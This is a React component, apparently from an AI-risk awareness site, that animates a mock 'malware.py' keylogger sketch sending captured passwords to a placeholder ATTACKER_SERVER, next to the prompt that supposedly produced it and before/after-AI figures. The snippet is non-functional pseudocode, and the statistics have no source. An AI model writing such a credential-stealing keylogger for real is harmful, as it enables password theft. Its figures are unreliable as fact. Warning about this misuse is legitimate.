import React, { useState, useEffect } from 'react'
import './MalwareCreation.css'

const MalwareCreation = () => {
  const [typedCode, setTypedCode] = useState('')
  const [showOutput, setShowOutput] = useState(false)

  const codeLines = [
    'import keylogger',
    'import network',
    '',
    'def steal_credentials():',
    '    keys = keylogger.capture()',
    '    passwords = extract_passwords(keys)',
    '    network.send(passwords, ATTACKER_SERVER)',
    '',
    'def main():',
    '    while True:',
    '        steal_credentials()',
    '        time.sleep(60)',
  ]

  const fullCode = codeLines.join('\n')

  useEffect(() => {
    let index = 0
    const timer = setInterval(() => {
      if (index <= fullCode.length) {
        setTypedCode(fullCode.slice(0, index))
        index++
      } else {
        setShowOutput(true)
        clearInterval(timer)
      }
    }, 30)

    return () => clearInterval(timer)
  }, [])

  return (
    <div className="malware-creation-section">
      <div className="malware-creation-content">
        <h2 className="malware-creation-title">Creating malware is now easy</h2>
        <p className="malware-creation-description">
          Before AI: Months of learning. Years of experience. Expert hackers only.
          Now: One prompt. Working code. Seconds.
        </p>
      </div>

      <div className="code-comparison">
        <div className="comparison-side before">
          <div className="side-header">Before AI</div>
          <div className="side-stats">
            <div className="stat-row">
              <span className="stat-label">Time required</span>
              <span className="stat-value">6-12 months</span>
            </div>
            <div className="stat-row">
              <span className="stat-label">Skills needed</span>
              <span className="stat-value">Expert programming</span>
            </div>
            <div className="stat-row">
              <span className="stat-label">People capable</span>
              <span className="stat-value">~10,000 worldwide</span>
            </div>
          </div>
        </div>

        <div className="comparison-divider">
          <div className="divider-line"></div>
          <div className="divider-text">vs</div>
          <div className="divider-line"></div>
        </div>

        <div className="comparison-side after">
          <div className="side-header">After AI</div>
          <div className="side-stats">
            <div className="stat-row">
              <span className="stat-label">Time required</span>
              <span className="stat-value danger">30 seconds</span>
            </div>
            <div className="stat-row">
              <span className="stat-label">Skills needed</span>
              <span className="stat-value danger">None</span>
            </div>
            <div className="stat-row">
              <span className="stat-label">People capable</span>
              <span className="stat-value danger">Anyone with internet</span>
            </div>
          </div>
        </div>
      </div>

      <div className="code-demo">
        <div className="prompt-box">
          <div className="prompt-label">Prompt</div>
          <div className="prompt-text">"Write a keylogger that captures passwords and sends them to a server"</div>
        </div>

        <div className="code-output">
          <div className="code-header">
            <div className="code-dot"></div>
            <div className="code-dot"></div>
            <div className="code-dot"></div>
            <span className="code-filename">malware.py</span>
          </div>
          <pre className="code-content">
            <code>{typedCode}<span className="cursor">|</span></code>
          </pre>
        </div>

        {showOutput && (
          <div className="output-box">
            <div className="output-label">Result</div>
            <div className="output-text">Working malware. Ready to deploy. Created in 30 seconds.</div>
          </div>
        )}
      </div>
    </div>
  )
}

export default MalwareCreation
